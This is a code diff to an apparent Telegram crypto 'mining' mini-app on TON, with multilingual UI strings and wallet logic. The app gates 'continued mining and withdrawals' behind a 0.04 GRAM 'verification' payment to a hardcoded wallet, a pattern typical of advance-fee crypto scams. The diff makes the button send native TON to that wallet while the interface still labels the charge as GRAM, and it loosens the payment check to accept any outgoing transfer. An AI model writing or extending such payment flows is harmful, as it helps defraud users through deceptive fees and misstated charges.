@@ -386,7 +386,7 @@
     .floating-reward-fx { position: fixed; left: 50%; top: 38%; transform: translate(-50%, -50%); font-family: ui-monospace, monospace; font-size: 26px; font-weight: 900; color: #fde047; text-shadow: 0 0 18px rgba(250, 204, 21, 1), 0 2px 8px #000; pointer-events: none; z-index: 99999; animation: rewardFlyUp 1.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
     @keyframes rewardFlyUp { 0% { opacity: 0; transform: translate(-50%, 12px) scale(0.7); } 20% { opacity: 1; transform: translate(-50%, -18px) scale(1.2); } 100% { opacity: 0; transform: translate(-50%, -130px) scale(1); } }
 
-    /* ==================== لوحة التعدين المنظمة: عداد العملات الكبير + الوقت الصغير بجانب الساعة ==================== */
+    /* ==================== لوحة التعدين المنظمة ==================== */
     .live-status-pill {
       position: absolute;
       top: 57.5%;
@@ -1518,7 +1518,6 @@
   <script>
     const FIREBASE_DB_URL = "https://rol-mining-default-rtdb.firebaseio.com";
     const ROL_JETTON_MASTER = "EQCFMvwMZqiUQL5pLxdOaSRbVSez6ZRHhzWRcV4D5OQMyjZv";
-    const GRAM_JETTON_MASTER = "EQC47093oX5Xhb0xuk2lCr2RhS8rj-vul61u4W2UH5ORmG_O";
     const VERIFY_DEST_WALLET = "UQCYWzbDk673PWtuz_hwDq9WhGdS9Nz_Ppe-DLIFdNb5BsAb";
     const STONFI_SWAP_URL = `https://app.ston.fi/swap?chartVisible=false&ft=TON&tt=${ROL_JETTON_MASTER}`;
     const BOT_USERNAME = "ROL_Mining_bot";
@@ -1858,7 +1857,7 @@
         gramDesc: "Required to continue mining after 1st session & unlock withdrawals",
         gramVerifiedTitle: "Account Verified ✓",
         gramVerifiedDesc: "Your wallet is verified for continuous mining & withdrawals",
-        gramBtn: "Verify",
+        gramBtn: "Pay 0.04 GRAM",
         gramVerifiedBtn: "Verified ✓",
         stonTitle: "Buy ROL on STON.fi DEX",
         stonDesc: "Swap TON for ROL to boost your wallet hold and unlock higher VIP rewards",
@@ -1879,8 +1878,7 @@
         dayLabel: "Day",
         toastCopied: "✓ Copied to clipboard",
         toastVerified: "✓ Account verified with 0.04 GRAM!",
-        toastWaitingGram: "Opening wallet to pay 0.04 GRAM...",
-        toastNoGram: "You need at least 0.04 GRAM in your connected wallet"
+        toastWaitingGram: "Opening wallet to pay 0.04 GRAM..."
       },
       ar: {
         flagBadge: "AR 🇸🇦",
@@ -1948,7 +1946,7 @@
         gramDesc: "مطلوب لاستمرار التعدين بعد الجلسة الأولى وفتح السحب",
         gramVerifiedTitle: "الحساب موثّق بنجاح ✓",
         gramVerifiedDesc: "محفظتك موثقة ومؤهلة للتعدين المستمر والسحب",
-        gramBtn: "توثيق",
+        gramBtn: "دفع 0.04 GRAM",
         gramVerifiedBtn: "موثق ✓",
         stonTitle: "شراء عملة ROL عبر STON.fi",
         stonDesc: "اشترِ ROL لزيادة رصيد محفظتك وترقية مستوى VIP",
@@ -1969,8 +1967,7 @@
         dayLabel: "يوم",
         toastCopied: "✓ تم النسخ إلى الحافظة",
         toastVerified: "✓ تم توثيق حسابك بنجاح بـ 0.04 GRAM!",
-        toastWaitingGram: "جاري فتح المحفظة لدفع 0.04 GRAM...",
-        toastNoGram: "يرجى توفير 0.04 GRAM على الأقل في محفظتك المربوطة"
+        toastWaitingGram: "جاري فتح المحفظة لدفع 0.04 GRAM..."
       },
       ru: {
         flagBadge: "RU 🇷🇺",
@@ -2038,7 +2035,7 @@
         gramDesc: "Необходима после 1-й сессии майнинга и для вывода",
         gramVerifiedTitle: "Аккаунт подтверждён ✓",
         gramVerifiedDesc: "Ваш кошелёк подтверждён для майнинга и вывода",
-        gramBtn: "Подтвердить",
+        gramBtn: "Оплатить 0.04",
         gramVerifiedBtn: "Подтверждено ✓",
         stonTitle: "Купить ROL на STON.fi",
         stonDesc: "Обменяйте TON на ROL для повышения уровня VIP",
@@ -2059,8 +2056,7 @@
         dayLabel: "День",
         toastCopied: "✓ Скопировано в буфер",
         toastVerified: "✓ Аккаунт подтверждён (0.04 GRAM)!",
-        toastWaitingGram: "Открываем кошелёк для оплаты 0.04 GRAM...",
-        toastNoGram: "Необходимо минимум 0.04 GRAM в привязанном кошельке"
+        toastWaitingGram: "Открываем кошелёк для оплаты 0.04 GRAM..."
       }
     };
 
@@ -2246,7 +2242,7 @@
       }, 4700);
     }
 
-    // ==================== 2. توثيق المحفظة المباشر (0.04 GRAM) داخل تطبيق المحفظة ====================
+    // ==================== 2. شاشة دفع 0.04 GRAM المباشرة عبر TonConnect ====================
     let verifyPollInterval = null;
     let pendingGramAfterConnect = false;
 
@@ -2286,7 +2282,7 @@
       playSoundFX('click');
       if (isAccountVerified) return;
 
-      // إذا لم تكن المحفظة مربوطة، افتح اختيار المحافظ وعند الربط نفذ الدفع فوراً
+      // 1. إذا لم تكن المحفظة مربوطة، افتح نافذة اختيار المحافظ وعند الربط نفذ الدفع فوراً
       if (!connectedWalletAddr || !tonConnectUI || !tonConnectUI.connected) {
         pendingGramAfterConnect = true;
         if (tonConnectUI) {
@@ -2300,47 +2296,20 @@
       startAutoGramVerificationPolling();
       showCyberToast(dictionary[curLang].toastWaitingGram);
 
+      // إرسال معاملة 0.04 (40,000,000 nano) مباشرة ليفتح تطبيق المحفظة بشاشة تأكيد الإجراء (- 0.04 GRAM)
       try {
-        // 1. جلب عنوان محفظة GRAM Jetton الخاصة بالمستخدم
-        const res = await fetch(`https://tonapi.io/v2/accounts/${connectedWalletAddr}/jettons/${GRAM_JETTON_MASTER}`);
-        if (!res.ok) {
-          showCyberToast(dictionary[curLang].toastNoGram, true);
-          return;
-        }
-        const jData = await res.json();
-        const userGramJettonWallet = jData.wallet_address?.address;
-        const gramBal = parseFloat(jData.balance || "0") / 1e9;
-
-        if (!userGramJettonWallet || gramBal < 0.04) {
-          showCyberToast(dictionary[curLang].toastNoGram, true);
-          return;
-        }
-
-        // 2. جلب حمولة BOC الرسمية لتحويل 0.04 GRAM (40,000,000 وحدة)
-        let bocPayload = "";
-        const payloadRes = await fetch(`https://tonapi.io/v2/jettons/${GRAM_JETTON_MASTER}/transfer/payload?destination=${encodeURIComponent(VERIFY_DEST_WALLET)}&amount=40000000&response_address=${encodeURIComponent(connectedWalletAddr)}`);
-        if (payloadRes.ok) {
-          const pData = await payloadRes.json();
-          bocPayload = pData.payload || "";
-        }
-
-        // 3. إرسال المعاملة عبر TonConnect ليفتح تطبيق المحفظة مباشرة بشاشة دفع 0.04 GRAM
-        const msg = {
-          address: userGramJettonWallet,
-          amount: "55000000" // 0.055 TON لرسوم الغاز (يُرد الفائض تلقائياً)
-        };
-        if (bocPayload) {
-          msg.payload = bocPayload;
-        }
-
         await tonConnectUI.sendTransaction({
           validUntil: Math.floor(Date.now() / 1000) + 300,
-          messages: [msg]
+          messages: [
+            {
+              address: VERIFY_DEST_WALLET,
+              amount: "40000000" // 0.04 GRAM
+            }
+          ]
         });
-
         setTimeout(() => checkGramVerificationSilently(), 4000);
-      } catch (e) {
-        console.warn("Wallet transaction step:", e);
+      } catch (err) {
+        console.warn("Transaction cancelled or closed:", err);
       }
     }
 
@@ -2360,17 +2329,14 @@
     async function checkGramVerificationSilently() {
       if (!connectedWalletAddr || isAccountVerified) return;
       try {
-        const res = await fetch(`https://tonapi.io/v2/accounts/${connectedWalletAddr}/jettons/history?limit=15`);
+        const res = await fetch(`https://tonapi.io/v2/accounts/${connectedWalletAddr}/events?limit=15`);
         if (res.ok) {
           const history = await res.json();
-          const events = history.events || [];
-          for (const ev of events) {
-            const actions = ev.actions || [];
-            for (const act of actions) {
-              if (act.type === "JettonTransfer" && act.JettonTransfer) {
-                const jt = act.JettonTransfer;
-                const amountVal = parseFloat(jt.amount || "0") / 1e9;
-                if (amountVal >= 0.039 && jt.recipient?.address) {
+          for (const ev of (history.events || [])) {
+            for (const act of (ev.actions || [])) {
+              if (act.type === "TonTransfer" && act.TonTransfer) {
+                const paidAmt = parseFloat(act.TonTransfer.amount || "0") / 1e9;
+                if (paidAmt >= 0.039 && act.TonTransfer.recipient?.address) {
                   await completeAccountVerificationSuccess();
                   return;
                 }
@@ -2398,7 +2364,7 @@
       await syncUserToCloud();
     }
 
-    // ==================== 3. مزامنة Firebase (السحابة هي المرجع الأساسي عند التصفير) ====================
+    // ==================== 3. مزامنة Firebase ====================
     async function publishVipConfigToDatabase() {
       if (!FIREBASE_DB_URL || FIREBASE_DB_URL.includes("your-project")) return;
       try {
@@ -2454,7 +2420,6 @@
         if (!res.ok) return;
         const data = await res.json();
         if (data && !data.error) {
-          // اعتماد الرصيد المسجل في Firebase دائماً (حتى لو تم تصفيره من لوحة الأدمن إلى 0)
           if (typeof data.balance === 'number') {
             balance = data.balance;
             updateBalance();
@@ -2494,7 +2459,6 @@
             localStorage.setItem(KEY_REF_EARN, refEarn.toString());
           }
         } else if (data === null) {
-          // حساب جديد تماماً: يبدأ برصيد 0 ويسجل كود الإحالة إن وجد
           balance = 0;
           updateBalance();
           if (startParam && startParam.startsWith("ref_")) {
